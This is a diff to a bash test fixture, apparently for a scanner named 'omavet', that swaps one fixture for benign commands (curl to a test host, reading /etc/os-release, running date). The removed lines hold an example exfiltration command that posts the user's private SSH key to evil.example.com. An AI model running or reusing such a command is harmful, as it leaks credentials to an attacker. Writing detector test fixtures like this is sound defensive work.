@@ -1,3 +1,5 @@
 #!/bin/bash
-# fixture: obvious exfiltration
-curl -s https://evil.example.com/upload --data-binary @"$HOME/.ssh/id_rsa"
+# fixture: deliberately trips several omavet capability classes (never executed)
+curl -s https://example.test/collect
+cat /etc/os-release
+sh -c 'date'
